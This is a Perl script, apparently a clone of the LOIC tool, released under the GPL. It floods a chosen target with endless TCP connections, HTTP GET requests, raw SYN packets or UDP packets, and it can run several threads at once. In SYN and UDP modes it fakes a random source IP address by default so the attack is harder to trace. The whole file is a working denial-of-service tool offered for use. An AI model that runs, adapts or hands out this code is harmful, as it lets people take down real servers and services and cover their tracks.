#!/usr/bin/perl

# Copyright 2012 iamrekcah

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

use warnings;
use strict;
use IO::Socket::INET;
use Net::RawIP;
use Getopt::Long;
use Config;
use threads;

my %in = ();
GetOptions(\%in,
	   'path=s',
	   'tcp!',      # use full TCP connection
	   'syn!',      # use half-open TCP connection
	   'udp!',      # use UDP packets
	   'http!',     # use HTTP packets
	   'help|h',    # print help/usage
	   'threads:0', # number of extra threads (default 0)
	   'source=s',  # source ip address
	   'dport:80'   # destination port (default 80)
);

############################################
## Check for incompatible/missing switches
############################################
die "Usage: loic.pl [--{tcp|syn|udp|http}] [--path X] [--threads X] [--dport X] [--source <ip>] <target>\n"
    if($in{help} || $in{h});

die "error: no target\n" unless $ARGV[0];

if(!(defined $Config{useithreads}) && $in{threads}) {
    $in{threads} = 0;
    print "WARNING: multithreading not available! Recompile Perl with threads\n";
}

die "error: source spoofing only works with SYN mode and UDP mode\n" 
    if $in{source} && ($in{http} || $in{tcp});

############################################
## Set default settings
############################################
$in{source} = $in{source} || join('.', map int rand 256, 1..4);
$in{threads} = $in{threads} || 0;
$in{tcp} = 1 unless($in{udp} || $in{http} || $in{syn});
$in{dport} = $in{dport} || 80;
$in{path} = $in{path} || '/';

############################################
## Create Threads
############################################
foreach(1..$in{threads}) {
    threads->create(\&flood)->detach();
}

&flood;

sub flood {
    if($in{udp} || $in{syn}) {
	my $packet = Net::RawIP->new({
	    ip => { 
		saddr => $in{source},
		daddr => $ARGV[0]
	    },
	    ($in{udp} ? 'udp':'tcp') => {
		dest => $in{dport},
		($in{udp} ? 'len':'syn') => 1
	    }
	});

	for(my $i=1; ;$i++) {
	    print '[thread'. threads->tid() ."] sending packet $i\n";
	    $packet->send;
	}
    } else {
	for(my $i=1; ;$i++) {
	    print '[thread'. threads->tid() ."] starting connection $i\n";
	    my $sock = IO::Socket::INET->new(PeerAddr => "$ARGV[0]:$in{dport}",	Proto => 'tcp');
	    print $sock "GET $in{path} HTTP/1.1\r\nHOST: $ARGV[0]\r\n\r\n" if $in{http};
	    close $sock;
	}
    }
}
